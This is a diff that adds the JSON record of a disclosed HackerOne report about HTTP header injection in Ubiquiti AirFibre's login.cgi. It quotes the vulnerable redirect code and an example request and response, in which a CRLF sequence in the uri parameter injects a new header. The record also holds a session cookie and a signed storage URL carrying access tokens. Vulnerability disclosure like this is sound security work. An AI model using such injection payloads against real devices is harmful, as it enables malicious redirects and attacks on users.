@@ -1,0 +1,119 @@
+{
+  "id": 203673,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDM2NzM=",
+  "url": "https://hackerone.com/reports/203673",
+  "title": "AirFibre products vulnerable to HTTP Header injection",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "none",
+  "readable_substate": "Resolved",
+  "created_at": "2017-02-05T21:32:19.196Z",
+  "submitted_at": "2017-02-05T21:32:19.196Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "simongurney",
+    "url": "/simongurney",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 800,
+    "url": "https://hackerone.com/ui",
+    "handle": "ui",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fpqjzgms7de9639u414bw6vid1be/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/fpqjzgms7de9639u414bw6vid1be/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Ubiquiti Inc.",
+      "twitter_handle": "ubiquiti",
+      "website": "https://ui.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2017-05-17T17:01:21.732Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-04-17T17:01:13.730Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "The uri GET parameter of Login.cgi is directly used (on login) to generate HTTP headers without sanitisation.  An user could be tricked into logging into the device and then redirected to a malicious location or attacked through other HTTP Header injection attacks.\n\nVulnerable code:\nif (isset($uri) && strlen($uri) > 0) {\nHeader(\"Location: \" + urldecode($uri));\nexit;\n\n----------------------\nExample POST\nPOST https://10.62.148.4/login.cgi HTTP/1.1\nConnection: keep-alive\nContent-Length: 363\nCache-Control: max-age=0\nOrigin: https://10.62.148.4\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarynT8O7Wj9TOBD7eKm\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nReferer: https://10.62.148.4/login.cgi?uri=/admin.cgi%0d%0aNewHeader:Value\nAccept-Encoding: br\nAccept-Language: en-US,en;q=0.8\nCookie: last_check=1486326659118; AIROS_SESSIONID=a89e9d80a7a7aa87e305f8638458e582; ui_language=en_US\nHost: 10.62.148.4\n\n------WebKitFormBoundarynT8O7Wj9TOBD7eKm\nContent-Disposition: form-data; name=\"uri\"\n\n/admin.cgi\nNewHeader:Value\n.....SNIPPED.....\n\nExample response:\n\nHTTP/1.1 302 Found\nLocation: /admin.cgi\nNewHeader: Value\nSet-cookie: ui_language=en_US; expires=Tuesday, 19-Jan-38 03:14:07 GMT\nContent-Type: text/html\nDate: Sun, 05 Feb 2017 21:08:27 GMT\nServer: lighttpd/1.4.30\n\n",
+  "weakness": {
+    "id": 27,
+    "name": "Improper Authentication - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 157623,
+      "file_name": "Untitled.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/157/623/950ad3598d7ca43aa5ff24323629eb1cc9c28b31/Untitled.png?response-content-disposition=attachment%3B%20filename%3D%22Untitled.png%22%3B%20filename%2A%3DUTF-8%27%27Untitled.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ47SYAPAJ%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T222504Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFQlZdM%2BiHDyN9oni09hrwl3M7K20t9Vimgie0HLfNmHAiEAqmczIiyJE5llSe1xTfXIl4Bw%2BJdB3CSV3xMFov%2FAjEAqsQUIHhADGgwwMTM2MTkyNzQ4NDkiDGTATplagYxC2xegDSqOBVn84RpirpPeAsluMTBHBJPPcy3TNEGPtOb1g030u4%2BQqyRdbkHOeu8azW2dxIVENOx%2BPHk6VlHJXgV4d8HUPIeOnM40HYuXdOSzYUTyt1WXFSGpLJaSWiB03TZqdL5bqtaEMJu5UcC5z0Cdi1GIpGFsgKzCdcJQoIzDumo7zZyZ9WeFC77ekgmM1Wt6PkAYvHPeQGAJhATn1vEvc0eNnbdytiwFaQqiSvnY248y0JnJ%2F8qEDgRgNIDTYy%2BJzW8C1rSBNfmG86RcOINqrieLUz7e4D0OkTiY3ZmFJbhxMGry%2F%2BEU0uPJ2FhesmCsjPO2Q4qYjxuLteizkHbOCEMIryUDZ6lO7FPCEwUuQA0P2zZurtU7jXF70OoMpRIdmvSFpxF105GouBl7u4C4DaZd%2FG0WwEmttAW7MyhDk0R0yhnPvqm5u3qPizlXSvkGMTiEiC0kbntCjFpywefw2gw4IDltu1ccvvL5MhDRHiWVi79rEQQNnH2f%2BDZP85IQoc6JaVsSNBJMvQfnewwbTD7Ve8qIx5%2FnwFoaPMzFesb8pogauw4KP6A2BgO4GV8009Dnb9gRZpLVeBdKQaRp8kfLcsKRc%2FNd5BHQ7sMY8%2FmY%2BO4JpNd1FyN7DVnJvxavLkiTgXasTxpsBv5AJM25fhDmYeoEP%2BCmGUg4yii3832kILdhoI%2BrOFaNfRVdc0bNPBU6CqfNblTVRbk6fENhXMpkleVhNNVkQIDtCeUaofRXCfZ37l7pHU%2BJEOcXS4%2BIK5G2rpM0hdrTd3uua3MyiCbytk80G%2BiqNDf3zpJcaKkMCC54U6%2ByYkzQecXdlJVEeRzqP%2F3XWXv05Oqq9lNtf8rUOhd5ClgytZTNvJL9vV%2B%2FLTDTxMHGBjqxAYBo0aIpQji0ejSypObDv3XihNYitgjKFJgsdYeEepYKQhlw706ugkA1witeimv%2FDB1hc4iHPgAkUx%2B%2FvZ40%2FJ0apXyV5UFGy2LgXNmdzhqfjs%2F06haJgUg6CCQ5j1nkvFaan%2FyNQpk6Hccl%2BRB%2FKl8l3LZuSPiFwq78Bit95f3pmhaUjWgj8CLMjvf%2F7enBBgJwOyrmphgHZ7DafHSAJ5bjgcbapH5OR7Fsyd2fMtoh%2Fw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0edaf25a74246e0d695f3b35e8a5b17a1643376ede8ed1dfced9bd4a64d00269",
+      "file_size": 10123,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2017-05-17T17:01:13.770Z",
+  "allow_singular_disclosure_after": -263453031.12999547,
+  "singular_disclosure_allowed": true,
+  "vote_count": 4,
+  "voters": [
+    "eveeez",
+    "pr0f0x01",
+    "spetr0x",
+    "destinedtohack"
+  ],
+  "severity": {
+    "rating": "none",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
